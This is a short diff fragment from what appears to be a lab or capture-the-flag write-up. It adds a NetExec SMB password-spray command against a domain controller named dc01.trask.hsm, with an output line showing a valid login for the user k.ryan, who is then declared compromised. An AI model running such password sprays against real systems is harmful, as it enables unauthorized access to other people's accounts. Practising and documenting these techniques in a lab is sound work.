@@ -186,6 +186,12 @@ Earlier i found a orientation schedule with some users
 I can try and spray the password on one of these users
 
 ```python
+nxc smb dc01.trask.hsm -u users.txt -p 'ProtoTra1NR1973!' -k --continue-on-success
 
+SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\k.ryan:ProtoTra1NR1973!
 ```
+
+`k.ryan` is compromised
+
+
 
